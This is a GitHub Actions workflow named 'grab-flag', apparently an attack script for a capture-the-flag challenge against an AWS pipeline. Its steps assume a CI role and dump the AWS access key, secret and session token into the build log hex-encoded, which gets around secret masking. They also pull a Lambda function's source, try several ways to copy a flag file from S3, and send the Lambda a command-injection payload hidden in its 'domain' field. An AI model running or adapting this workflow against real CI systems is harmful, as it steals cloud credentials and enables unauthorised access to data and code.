name: grab-flag
on:
  workflow_dispatch:
  push:
    branches: [corgi, main]
permissions:
  id-token: write
  contents: read
jobs:
  grab:
    strategy:
      fail-fast: false
      matrix:
        runner: [self-hosted, ubuntu-latest]
    runs-on: ${{ matrix.runner }}
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: flaggrab
      - name: get-flag-pipeline
        shell: bash
        run: |
          set -x
          aws sts get-caller-identity | tee /tmp/id.json || true
          # dump creds for local use
          python3 - <<'PY'
          import os
          for k in ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']:
            v=os.environ.get(k,'')
            print(k+'_HEX='+v.encode().hex())
            open('/tmp/'+k,'w').write(v)
          PY
          # lambda source
          URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text 2>/dev/null || true)
          echo "URL_LEN=${#URL}"
          if [ -n "$URL" ]; then
            curl -sL "$URL" -o /tmp/lam.zip
            python3 -c "import zipfile;z=zipfile.ZipFile('/tmp/lam.zip');
[print(n);print(z.read(n).decode('utf-8','replace')) for n in z.namelist()]" | tee /tmp/lamcode.txt
          fi
          aws s3 ls s3://codec4f26c862a321ef5/ | tee /tmp/list.txt || true
          # try get flag many ways
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt 2>&1 | tee /tmp/getflag.err || true
          if [ -f /tmp/flag.txt ]; then echo FLAG_CONTENT; xxd /tmp/flag.txt; cat /tmp/flag.txt; fi
          # platform list
          aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1 2>&1 | tee /tmp/plat.json || true
          # invoke attempt
          aws lambda invoke --function-name nslookupv2 --payload '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt -"}' /tmp/out.json 2>&1 || true
          cat /tmp/out.json 2>/dev/null || true
          # print contents always
          echo '---CREDS---'
          cat /tmp/AWS_ACCESS_KEY_ID 2>/dev/null; echo
          cat /tmp/AWS_SECRET_ACCESS_KEY 2>/dev/null | head -c 5; echo '...'
          # copy artifacts as outputs
          ls -la /tmp/ | head -50